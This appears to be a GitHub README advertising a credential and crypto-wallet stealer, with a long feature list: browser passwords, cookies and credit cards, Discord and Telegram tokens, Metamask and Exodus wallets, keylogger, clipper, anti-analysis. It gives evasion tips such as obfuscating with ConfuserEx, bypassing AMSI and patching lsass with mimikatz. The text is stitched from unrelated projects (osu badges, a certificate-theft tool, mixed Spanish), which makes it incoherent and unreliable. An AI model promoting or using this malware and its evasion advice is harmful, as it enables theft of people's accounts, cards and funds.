# Password-History-Cookies-Card-Exodus-Metamask-Token-Stealer-All-Browsers-Grabber
![GitHub release](https://img.shields.io/github/release/ppy/osu.svg)
![CodeFactor](https://www.codefactor.io/repository/github/ppy/osu/badge)
![dev chat](https://discordapp.com/api/guilds/188630481301012481/widget.png?style=shield)
![Crowdin](https://d322cqt584bo4o.cloudfront.net/osu-web/localized.svg)
![Renovate enabled](https://img.shields.io/badge/renovate-enabled-brightgreen.svg)
![license](https://img.shields.io/github/license/mashape/apistatus.svg)
![Chat](https://badges.gitter.im/awesome-twitter-bots/Lobby.svg)

![91297894-web-pirate-and-bitcoin-hacker-thief-and-crypto-currency-steal-virtual-money-vector-illustra-removebg-preview](https://user-images.githubusercontent.com/106811566/171998257-2513d43a-18e1-4473-b9a6-20ecd11081b6.png)


# How This Work? What is this?

This is a P.O.C bitcoin stealer strictly for educational purposes written in C# purely ... Sole purpose is to detect the user's bitcoin wallet and change it to the malicious bitcoin wallet Quite basic so all trolls allowed.A (v3.5 compatible) .NET tool for stealing and importing certificates in the Windows certificate store without touching disk. Useful for red team operations where you need to poach a certificate for pivoting purposes and want to do so with an in-memory post-ex payload.

This tool is flagged as malware by Defender. DO NOT run it from disk on-target. DO NOT run it in memory on target WITHOUT AMSI BYPASSED. And DO obfuscate it with a tool like ConfuserEx, just in case.

If you export a certificate with a private key as PFX then the password will be blank by default. *Blank*, not non-existent. Optionally, you may specify a password with the `--password` argument.

If keys are marked as not exportable then you will have to patch CAPI to allow export of non-exportable keys in the current process. This can be done with mimikatz via the `crypto::capi` command. If you are trying to export device certificates that are not exportable, mimikatz can instead patch the memory of the running lsass.exe process to bypass protections using the `crypto::cng` command.

![image](https://user-images.githubusercontent.com/106811566/171998208-78ca8a28-453d-4d0d-a585-061ba29cce20.png)


Alternatively, you may extract the private keys manually using DPAPI operations. Use the user's DPAPI masterkey, (or a password, domain DPAPI private key, or system backup key to first decrypt the user's masterkey) to extract and decrypt the user's certificates from the registry. This can be done with SharpDPAPI or mimikatz. For more details, checkout the THEFT2 and THEFT3 sections of SpecterOps's whitepaper: [Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2). (Really you should just read that whole paper.)

# Next Do
- [x] Solo propósito educativo
- [x] Prohibida la reventa
- [ ] Puede usar el código fuente si mantiene los créditos (en incrustación + en rebajas), tiene que ser de código abierto
- [x] NO somos responsables de nada de lo que haga con nuestro software (si es ilegal)

# Features
- Registrador de códigos QR
- Discord Login Stealer
- Nombre de usuario
- ID
- Token
-  Bypass new security mechanisms
- Bypass Two-step verification!
- Bypass Inherent identity and need 5-digit verification code!
- Support SMTP Transport
- Support Telegram API Transport (With Proxy)
- Support FakeMessage
- Support Custom Icons
- Bypass A.V (Comming soon...)
- Inspect Element Detection
- Custom Design
- Cool design
- AntiAnalysis (VirtualBox, SandBox, Debugger, VirusTotal, Any.Run)
- Get system info (Version, CPU, GPU, RAM, IPs, BSSID, Location, Screen metrics, Installed apps)
- Chromium based browsers (passwords, credit cards, cookies, history, autofill, bookmarks)
- Firefox based browsers (db files, cookies, history, bookmarks)
- Internet explorer/Edge (passwords)
- Saved wifi networks & scan networks around device (SSID, BSSID)
- File grabber (Documents, Images, Source codes, Databases, USB)
- Detect banking & cryptocurrency services in browsers
- Steam, Uplay, Battle.Net, Minecraft session
- Install keylogger & clipper
- Desktop & Webcam screenshot
- ProtonVPN, OpenVPN, NordVPN
- Crypto Wallets
- Zcash, Armory, Bytecoin, Jaxx, Exodus, Ethereum, Electrum, AtomicWallet, Guarda, Coinomi, Litecoin, Dash, Bitcoin
- Crypto Wallet Extensions from Chrome & Edge
- Binance, coin98, Phantom, Mobox, XinPay, Math10, Metamask, BitApp, Guildwallet, iconx, Sollet, Slope Wallet, Starcoin, Swash, Finnie, KEPLR, Crocobit, OXYGEN, Nifty, Liquality, Auvitas wallet, Math wallet, MTV wallet, Rabet wallet, Ronin wallet, Yoroi wallet, ZilPay wallet, Exodus, Terra Station, Jaxx.
- Messenger Sessions, Accounts, Tokens
- Discord, Telegram, ICQ, Skype, Pidgin, Outlook, Tox, Element, Signal
- Directories structure
- Filezilla hosts
- Process list
- Product key
 ![image](https://user-images.githubusercontent.com/106811566/171998185-ed2a3743-8092-4237-96d7-25f7ca6388e3.png)
- Autorun module
- Instant transactions
- No contract required
- Anti Metamask Phishing Detections
- Support SMTP Transport!
- Support Telegram API Transport!
- Support FakeMessage!
- Support Custom Icon!
- Bypass Two-step confirmation
- Bypass Inherent identity and need 5-digit verification code
- Support for the official telegram desktop only windows !
- Contraseña (incluso cuando cambia)
- Email
- Badges
- Nitro
- Número de Tarjeta de Crédito
- CVC
- Vencimiento
- Facturación
- IP
- Nombre de host de la computadora
- Cerrar sesión al instante
- Deshabilitar código QR
- Incrustacion personalizada
- Estructura de código genial
- Cookies 
- Contraseña 
- Cookie Automatic Logger 
- Metamask stealer 
- Exodus stealer 
 -Anti-Delte y Anti-Spam 
- 0/64 Detecciones 

# Requirements:
If you want to build from the source these are the requirements.
 - [Visual Studio 2022 (v17.*)](https://visualstudio.microsoft.com/vs/)
 - [NET SDK 6.0.*](https://dotnet.microsoft.com/en-us/download/dotnet/6.0) (included in Visual Studio 2022)
 - [NET Framework SDK 4.8](https://dotnet.microsoft.com/en-us/download/dotnet-framework/net48) (included in Visual Studio 2022)

 # Runtime requirements.
 Only needed if u download the release from [Releases](https://github.com/Stealerium/Stealerium/releases) (stealerium.zip)
 - Builder.exe ([NET Runtime 6.0.*](https://dotnet.microsoft.com/en-us/download/dotnet/6.0))
 - Stub ([NET Framework 4.8](https://dotnet.microsoft.com/en-us/download/dotnet-framework/net48))
